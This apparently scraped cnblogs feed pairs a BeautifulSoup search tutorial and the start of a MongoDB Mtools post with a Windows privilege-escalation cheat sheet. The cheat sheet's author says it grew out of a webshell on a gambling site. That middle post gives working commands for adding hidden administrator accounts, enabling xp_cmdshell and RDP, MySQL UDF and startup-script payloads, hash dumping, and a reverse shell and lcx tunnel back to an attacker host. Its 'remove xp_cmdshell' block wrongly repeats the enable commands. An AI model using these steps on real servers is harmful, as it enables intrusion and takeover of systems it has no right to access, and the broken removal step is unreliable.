&amp;lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&amp;gt;Lacie&amp;lt;/a&amp;gt; and
&amp;lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;;
and they lived at the bottom of a well.&amp;lt;/p&amp;gt;

&amp;lt;p class=&quot;story&quot;&amp;gt;...&amp;lt;/p&amp;gt;
&lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;变量准备&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;1，五种过滤器&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;字符串、正则表达式、列表、True、方法&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; bs4 &lt;span&gt;import&lt;/span&gt;&lt;span&gt; BeautifulSoup
soup&lt;/span&gt;=BeautifulSoup(html_doc,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;lxml&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)


&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;1、字符串：即标签名&lt;/span&gt;
&lt;span&gt;print&lt;/span&gt;(soup.find_all(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;b&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;))

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;2、正则表达式&lt;/span&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; re
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(soup.find_all(re.compile(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;^b&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;))) &lt;span&gt;#&lt;/span&gt;&lt;span&gt;找出b开头的标签，结果有body和b标签&lt;/span&gt;

&lt;span&gt;#&lt;/span&gt;&lt;span&gt;3、列表：如果传入列表参数,Beautiful Soup会将与列表中任一元素匹配的内容返回.下面代码找到文档中所有&amp;lt;a&amp;gt;标签和&amp;lt;b&amp;gt;标签:&lt;/span&gt;
&lt;span&gt;print&lt;/span&gt;(soup.find_all([&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;b&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]))

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;4、True：可以匹配任何值,下面代码查找到所有的tag,但是不会返回字符串节点&lt;/span&gt;
&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(soup.find_all(True))
&lt;/span&gt;&lt;span&gt;for&lt;/span&gt; tag &lt;span&gt;in&lt;/span&gt;&lt;span&gt; soup.find_all(True):
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(tag.name)

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;5、方法:如果没有合适过滤器,那么还可以定义一个方法,方法只接受一个元素参数 ,如果这个方法返回 True 表示当前元素匹配并且被找到,如果不是则反回 False&lt;/span&gt;
&lt;span&gt;def&lt;/span&gt;&lt;span&gt; has_class_but_no_id(tag):
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; tag.has_attr(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;) &lt;span&gt;and&lt;/span&gt; &lt;span&gt;not&lt;/span&gt; tag.has_attr(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(soup.find_all(has_class_but_no_id))
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;2、按照类名查找&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;注意：关键字是class_，class_=value,value可以是五种选择器之一&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;print&lt;/span&gt;(soup.find_all(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,class_=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;sister&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 查找类为sister的a标签&lt;/span&gt;
&lt;span&gt;print&lt;/span&gt;(soup.find_all(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,class_=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;sister ssss&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 查找类为sister和sss的a标签，顺序错误也匹配不成功&lt;/span&gt;
&lt;span&gt;print&lt;/span&gt;(soup.find_all(class_=re.compile(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;^sis&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;))) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 查找类为sister的所有标签&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;3、attrs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;print&lt;/span&gt;(soup.find_all(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;p&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,attrs={&lt;span&gt;'&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:&lt;span&gt;'&lt;/span&gt;&lt;span&gt;story&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;}))
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;4、text&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;值可以是：字符，列表，True，正则&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;print&lt;/span&gt;(soup.find_all(text=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Elsie&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;))
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(soup.find_all(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,text=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Elsie&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;))
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;5、limit参数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果文档树很大那么搜索会很慢.如果我们不需要全部结果,可以使用 limit 参数限制返回结果的数量.效果与SQL中的limit关键字类似,当搜索到的结果数量达到 limit 的限制时,就停止搜索返回结果&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;print&lt;/span&gt;(soup.find_all(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,limit=2))
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;6、recursive&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;调用tag的 find_all() 方法时,Beautiful Soup会检索当前tag的所有子孙节点,如果只想搜索tag的直接子节点,可以使用参数 recursive=False .&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;print&lt;/span&gt;(soup.html.find_all(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;))
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(soup.html.find_all(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,recursive=False))
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;tag&lt;/h3&gt;
&lt;p&gt;像调用 find_all() 一样调用tag find_all() 几乎是Beautiful Soup中最常用的搜索方法,所以我们定义了它的简写方法. BeautifulSoup 对象和 tag 对象可以被当作一个方法来使用~&lt;/p&gt;
&lt;p&gt;这个方法的执行结果与调用这个对象的 find_all() 方法相同~&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 下面两行代码是等价的:&lt;/span&gt;
soup.find_all(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
soup(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 这两行代码也是等价的:&lt;/span&gt;
soup.title.find_all(text=&lt;span&gt;True)
soup.title(text&lt;/span&gt;=True)
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;find&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;find( name , attrs , recursive , text , **kwargs )&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;find_all() 方法将返回文档中符合条件的所有tag,尽管有时候我们只想得到一个结果.比如文档中只有一个&amp;lt;body&amp;gt;标签,那么使用 find_all() 方法来查找&amp;lt;body&amp;gt;标签就不太合适, 使用 find_all 方法并设置 limit=&lt;span class=&quot;hljs-number&quot;&gt;1 参数不如直接使用 find() 方法&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;下面两行代码是等价的:

soup.find_all(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, limit=1&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; [&amp;lt;title&amp;gt;The Dormouse's story&amp;lt;/title&amp;gt;]&lt;/span&gt;
soup.find(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; &amp;lt;title&amp;gt;The Dormouse's story&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;唯一的区别是 find_all() 方法的返回结果是值包含一个元素的列表,而 find() 方法直接返回结果.&lt;br/&gt;find_all() 方法没有找到目标是返回空列表, find() 方法找不到目标时,返回 None .&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;print&lt;/span&gt;(soup.find(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;nosuchtag&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;))
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; None&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;soup.head.title 是 tag的名字 方法的简写.这个简写的原理就是多次调用当前tag的 find() 方法:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;soup.head.title
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; &amp;lt;title&amp;gt;The Dormouse's story&amp;lt;/title&amp;gt;&lt;/span&gt;
soup.find(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;).find(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; &amp;lt;title&amp;gt;The Dormouse's story&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

</description>
<pubDate>Thu, 24 Jan 2019 15:42:00 +0000</pubDate>
<dc:creator>温而新</dc:creator>
<og:description>一，正则表达式解析 re正则就不写了，前面已经写入一篇很详细的正则表达式模块了~ 而且，在爬虫中，下面两种方式用的多一些~ 正则表达式：https://www.cnblogs.com/peng104/</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/peng104/p/10317601.html</dc:identifier>
</item>
<item>
<title>windows提权总结 - v01cano</title>
<link>http://www.cnblogs.com/v01cano/p/10317458.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/v01cano/p/10317458.html</guid>
<description>&lt;p&gt;0，起因，由于前几天拿了一个菠菜站的webshell，但是只有iis权限，执行无法创建用户等操作，更无法对整个服务器进行控制了，于是此时便需要提权了，对于一个刚刚入门的小白来说，此刻真正意识到了提权的重要性，于是便开始学习提取相关知识，以拿下该菠菜的站点。&lt;/p&gt;
&lt;h2 id=&quot;提权前的准备工作&quot;&gt;提权前的准备工作&lt;/h2&gt;
&lt;p&gt;1，通常来说，不同的脚本所处的权限是不一样的。这就意味着，如果该站点支持权限更高的脚本，我们可以上传该权限更高的脚本的大马，进而拿到更高的权限。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;asp/php 通常为匿名权限(网络服务权限)&lt;/li&gt;
&lt;li&gt;aspx 通常为user权限&lt;/li&gt;
&lt;li&gt;jsp 通常为系统权限&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;2，提权中常常也需要进行信息收集：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;内外网&lt;/li&gt;
&lt;li&gt;服务器系统和版本位数&lt;/li&gt;
&lt;li&gt;服务器的补丁情况&lt;/li&gt;
&lt;li&gt;服务器的安装软件情况&lt;/li&gt;
&lt;li&gt;服务器的防护软件情况&lt;/li&gt;
&lt;li&gt;端口情况&lt;/li&gt;
&lt;li&gt;所支持的脚本情况&lt;/li&gt;
&lt;li&gt;...............................等等&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;3，windows信息收集中常用的命令：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;ipconfig /all    查看当前ip
net user         查看当前服务器账号情况
netstat -ano     查看当前服务器端口开放情况
ver              查看当前服务器操作系统
systeminfo       查看当前服务器配置信息（补丁情况）
tasklist /svc    查看当前服务器进程情况
taskkill -pid pid号  结束某个pid号的进程
taskkill /im qq.exe /f 结束qq进程，如果对命令不清楚，可以使用taskkill /? 进行查看
net user v01cano v01cano /add 添加一个用户名为v01cano密码为v01cano的用户
net localgroup administrators v01cano /add 将用户v01cano添加到管理员组
whoami                   查看当前操作用户（当前权限） &lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;cmd命令执行提权&quot;&gt;cmd命令执行提权&lt;/h2&gt;
&lt;p&gt;cmd命令执行提权-拿到webshell后，通常是无法执行cmd命令的，常见的阻断cmd命令执行有如下三种：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;防护软件拦截&lt;/li&gt;
&lt;li&gt;cmd被降权&lt;/li&gt;
&lt;li&gt;组件被删除&lt;/li&gt;
&lt;li&gt;被拦截和降权的解决方案，找可读写目录，上传cmd.exe，调用自己上传的cmd.exe，执行cmd命令。&lt;/li&gt;
&lt;li&gt;组件被删除解决方案：检查是否支持aspx，如果支持，则可以通过aspx直接调用系统的cmd命令。或者换个脚本试试，比如换个php或者asp的大马试试。&lt;/li&gt;
&lt;li&gt;https://www.cnblogs.com/v01cano/p/10293838.html&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;ftp软件提权&quot;&gt;FTP软件提权：&lt;/h2&gt;
&lt;p&gt;常见的FTP软件有server-u，g6ftp，filezilla等等。&lt;/p&gt;
&lt;p&gt;https://www.cnblogs.com/v01cano/p/10310822.html&lt;/p&gt;
&lt;h2 id=&quot;远程管理软件提权&quot;&gt;远程管理软件提权：&lt;/h2&gt;
&lt;p&gt;常见的远程管理软件有teamviewer，pcanywhere，radmin，vnc等等。&lt;/p&gt;
&lt;p&gt;1，teamviewer提权：比较难，官方响应更新较快。&lt;/p&gt;
&lt;p&gt;2，pcanywhere提权：（默认端口5631,5632）一般下载安装根目录下的hosts文件夹下的PCA.admin.CIF文件，然后使用pcanywhere破解.exe可执行程序读取其用户名和密码，然后即可进行连接远控。&lt;/p&gt;
&lt;p&gt;3，radmin提权：（默认端口4899）直接使用大马中的Radmin提权，可以直接读取Radmin的密码（密文），同样使用工具radmin_hash.exe直接新建连接，然后右键完全控制，将32位的hash密文直接输入即可（注：在大马里面获取的密文为大写，需要先进行小写转换）&lt;/p&gt;
&lt;p&gt;4，vnc提权：@1，通过读取注册表的十进制数，将其转换成十六进制数。（使用大马中读取注册表选项，选择vnc4密码选项，进行读取）@2，使用工具vncx4.exe破解十六进制数后得到密码，即首先输入vncx4.exe -W回车，然后将转换后的十六进制数依次输入。@3，使用破解得到的密码连接vnc。&lt;/p&gt;
&lt;h2 id=&quot;windows溢出提权&quot;&gt;windows溢出提权：&lt;/h2&gt;
&lt;p&gt;主要是通过windows漏洞利用来获取系统权限，常见的溢出提权有巴西烤肉，pr等。&lt;/p&gt;
&lt;p&gt;提权步骤如下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;通过systeminfo命令查看服务器打了哪些补丁。&lt;/li&gt;
&lt;li&gt;根据未打补丁的漏洞进行利用即可。可以通过getroot tools工具进行查看有哪些漏洞未打补丁。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;破解hash提权&quot;&gt;破解hash提权：&lt;/h2&gt;
&lt;p&gt;前提：需要system权限。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;上传pwdunp7.exe运行获取hash值或者使用pass.exe读取内存中的明文密码。&lt;/li&gt;
&lt;li&gt;拿到lc5，彩虹表或者cmd5中解密&lt;/li&gt;
&lt;li&gt;即可得到管理员密码&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;启动项提权&quot;&gt;启动项提权：&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;前提写入的目录需要写入权限&lt;/li&gt;
&lt;li&gt;将批处理文件上传到开启启动项目录等待管理员重启即可。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;数据库提权&quot;&gt;数据库提权：&lt;/h2&gt;
&lt;h3 id=&quot;sqlserver数据库提权&quot;&gt;sqlserver数据库提权&lt;/h3&gt;
&lt;p&gt;1，首先需要获取sa账号，或者其他管理员账号。获取方法，查看config.asp，conn.asp，database.asp等文件。&lt;/p&gt;
&lt;p&gt;2，安装cmd_shell组件&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;  执行如下命令安装cmd_shell组件，默认无法直接执行cmd命令：
  EXEC sp_configure 'show advanced options', 1
  GO
  RECONFIGURE
  GO
  EXEC sp_configure 'xp_cmdshell', 1
  GO
  RECONFIGURE
  GO
  删除cmd_shell组件：
  EXEC sp_configure 'show advanced options', 1
  GO
  RECONFIGURE
  GO
  EXEC sp_configure 'xp_cmdshell', 1
  GO
  RECONFIGURE
  GO
  如果在添加用户到管理员组administrators的时候遇到安全狗而无法添加，则可以添加用户到Remote desktop Users远程组，远程组的用户同样可以进行远程连接。&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;3，开启3389&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;开启3389的sql语句：
exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;
关闭3389的sql语句：
exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',1;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;4，创建用户，加入到administrators组或者Remote desktop Users组&lt;/p&gt;
&lt;h3 id=&quot;mysql数据库提权&quot;&gt;mysql数据库提权&lt;/h3&gt;
&lt;p&gt;前提：需要是数据库管理员权限才可以进行提权操作。&lt;/p&gt;
&lt;h4 id=&quot;一udf提权&quot;&gt;一，udf提权&lt;/h4&gt;
&lt;p&gt;1，获取到对方mysql数据库下的root账号和密码，常用的获取方法有：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;查看网站源码里面的数据库配置文件（inc,conn,config.sql,common,data等）&lt;/li&gt;
&lt;li&gt;查看数据库安装路径下的user.myd(/data/mysql/)&lt;/li&gt;
&lt;li&gt;暴力破解mysql密码，破解3306端口入侵。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;2，udf提权原理：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;通过root权限导出udf.dll到系统目录下，可以通过udf.dll调用执行cmd。
create function cmdshell returns string soname 'udf.dll' 
select cmdshell('net user iis_user 123!@#abcABC /add'); 
select cmdshell('net localgroup administrators iis_user /add'); 
drop function cmdshell;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;3，udf提权常用方法：&lt;/p&gt;
&lt;p&gt;直接上传udf大马，对如上命令进行自动执行，从而达到提权的目的。&lt;/p&gt;
&lt;h4 id=&quot;二启动项提权&quot;&gt;二，启动项提权&lt;/h4&gt;
&lt;p&gt;启动项提权原理：使用较少&lt;br/&gt;1，查看数据库中有些什么数据表&lt;br/&gt;mysql&amp;gt;show tables;&lt;br/&gt;默认的情况下，test中没有任何表的存在。&lt;br/&gt;2，在test数据库下创建一个新的表；&lt;br/&gt;mysql&amp;gt;create table a(cmd text);&lt;br/&gt;我们创建了一个新的表，表名为a，表中只存放一个字段，字段名为cmd,为test文本。&lt;br/&gt;3，在表中插入新的内容：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;insert into a values(“set wshshell=createobject(“”wscript.shell””)”);
insert into a values(“a=wshshell.run(“”cmd.exe /c net user v01cano v01cano /add“”,0)”);
insert into a values(“b=wshshell.run(“”cmd.exe /c net localgroup administrators v01cano /add“”,0)”);
select * from a into outfile “C://docume~1//「开始」菜单//程序//启动//a.vbs”;
重启即可创建该用户。&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;三mof提权&quot;&gt;三，mof提权&lt;/h4&gt;
&lt;pre&gt;
&lt;code&gt;mof提权原理：
第一种方法：
上传mof.php,输入相关信息，执行命令，提权。
第二种方法：
上传x.mof文件，使用select命令导出到正确的位置。
select load_file('C:/php/APMServ5.2.6/www/htdocs/1.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'
允许外部地址使用root用户连接的sql语句：
Grant all privileges on *.* to 'root'@'%' IDENTIFIED BY &quot;root账户密码&quot; with grant option;&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;四反链端口提权反弹shell&quot;&gt;四，反链端口提权（反弹shell）&lt;/h4&gt;
&lt;p&gt;反链端口提权原理：可以使用udf提权的大马进行操作。&lt;br/&gt;1，利用mysql客户端工具连接mysql服务器，然后执行下面的操作。&lt;br/&gt;执行命令：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;mysql.exe -h 192.168.174.151 -uroot -p
enter password:
mysql&amp;gt;\. C:\mysql.txt
mysql&amp;gt;select backshell(&quot;YourIP&quot;,端口);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;2，本地监听你反弹的端口：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;nc.exe -v -l -p 端口&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;成功后，你可以获得一个system权限的cmdshell，其实这个也是利用udf提权，即使用udf提权的大马进行反弹shell提权。&lt;/p&gt;
&lt;h4 id=&quot;五内网端口转发&quot;&gt;五，内网端口转发：&lt;/h4&gt;
&lt;pre&gt;
&lt;code&gt;1，内网端口转发常用操作。

内网主机输入命令：该外网ip为黑客的某台服务器。
lcx.exe -slave 外网ip 外网端口 内网ip 内网端口
lcx.exe -slave 200.1.1.1 1111 192.168.1.2 3389

外网主机输入命令：
lcx.exe -listen 1111 1311&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;开启3389常用方法&quot;&gt;开启3389常用方法&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;使用批处理文件开启3389&lt;/li&gt;
&lt;li&gt;使用sql语句开启3389&lt;/li&gt;
&lt;li&gt;使用exe开启3389&lt;/li&gt;
&lt;li&gt;使用vb开启3389&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;windows常用权限提升命令&quot;&gt;windows常用权限提升命令&lt;/h2&gt;
&lt;pre&gt;
&lt;code&gt;常用命令：
type E:\wwwroot\web.config 查看文件内容

cacls命令：

/T            更改当前目录及其所有子目录中指定文件的 ACL。
/E            编辑 ACL 而不替换。
/C            在出现拒绝访问错误时继续。
/G user:perm  赋予指定用户访问权限。Perm 可以是: R读取，W写入，C更改(写入)，F完全控制。
/R user       撤销指定用户的访问权限(仅在与 /E 一起使用时合法)。

cacls C:\wwwroot\1.html /t /e /c /g v01cano:f

要修改一个文件权限的必要条件：
有user组的完全控制权限，cmd权限。&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Thu, 24 Jan 2019 15:00:00 +0000</pubDate>
<dc:creator>v01cano</dc:creator>
<og:description>windows提权 0，起因，由于前几天拿了一个菠菜站的webshell，但是只有iis权限，执行无法创建用户等操作，更无法对整个服务器进行控制了，于是此时便需要提权了，对于一个刚刚入门的小白来说，此</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/v01cano/p/10317458.html</dc:identifier>
</item>
<item>
<title>推荐一款关于MongoDB日志分析的工具--Mtools - 东山絮柳仔</title>
<link>http://www.cnblogs.com/xuliuzai/p/10317421.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xuliuzai/p/10317421.html</guid>
<description>&lt;h2&gt;一. 需求背景&lt;/h2&gt;
&lt;p&gt;MongoDB数据库的强大的文档模型使其成为处理数据的最佳方式。文档适用于广泛的流行数据模型，支持各种各样的场景。文档模型可以包含键值、关系数据集和图形数据集，当然，还可以包含父子关系、列表/数组以及其他层次关系，它们比传统的关系型数据库技术（表格）具有更大的灵活性。由于文档模型与主流面向对象编程语言中的对象直接对应，因此开发人员可以根据现实世界中实体之间的自然关系存储和组织数据，从而将重点放在以最有意义的方式构建应用程序上，而不是围绕其数据库的局限性开展工作。因此，使用文档模型显著提高了开发人员的生产效率，使组织机构能够更快地进行创新。MongoDB CEO 兼总裁Dev Ittycheria称之为： 文档即未来。&lt;/p&gt;
&lt;p&gt;但是MongoDB通用的监控工具有限，其中又有一部分还是要收费的,通过工具 Percona Monitoring and Management 进行监控，是个不错的选择。但在慢查询收集方面，需要开启Profiling，对性能方面会有一些侵害，另外，更细粒度的监控项维护起来也不容易。如果不想不开启Profiling，我们还可以通过收集分析mongodb的运行log来来进行性能监控，并且通过运行日志还可以获取更多的运行状态相关的信息。&lt;/p&gt;
&lt;p&gt;今天介绍的就是一款专门用来读取、分析MongoDB运行日志的工具--Mtools。&lt;/p&gt;
&lt;h2&gt; 二. Mtools 的介绍&lt;/h2&gt;
&lt;p&gt; Mtools的工具包和功能可以通过下面的List来描述。&lt;/p&gt;
&lt;table border=&quot;0&quot;&gt;&lt;tbody readability=&quot;32&quot;&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;工具包&lt;/td&gt;
&lt;td&gt;工具&lt;/td&gt;
&lt;td&gt;功能概览&lt;/td&gt;
&lt;td&gt;实现功能&lt;/td&gt;
&lt;td&gt;执行的命令（案例）&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;6&quot;&gt;&lt;td rowspan=&quot;13&quot;&gt;mtools&lt;/td&gt;
&lt;td rowspan=&quot;4&quot;&gt;Mlogfilter&lt;/td&gt;
&lt;td rowspan=&quot;4&quot;&gt;mlogfileter可以简单理解为日志的过滤器&lt;/td&gt;
&lt;td&gt;列出日志文件中所有的slow log(以json格式输出) &lt;/td&gt;
&lt;td&gt;mlogfilter &lt;em&gt;&lt;strong&gt;mongod.log&lt;/strong&gt;&lt;/em&gt; --slow 100 --json&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;通--from 和 --to 参数限定搜索范围&lt;/td&gt;
&lt;td&gt;mlogfilter &lt;em&gt;&lt;strong&gt;mongod.log&lt;/strong&gt;&lt;/em&gt; --slow 100 --from 2018-12-10T09:32:26 --to 2018-12-10T09:58:26&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;上面命令限定范围 也通过 to 来指定时间段，例如监控10min内的数据&lt;/td&gt;
&lt;td&gt;mlogfilter &lt;em&gt;&lt;strong&gt;mongod.log&lt;/strong&gt;&lt;/em&gt;  --from 2018-12-10T09:32:26 --to +10min&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;通过mlogfilter查询日志中某个表的slow log(超过100ms的)&lt;/td&gt;
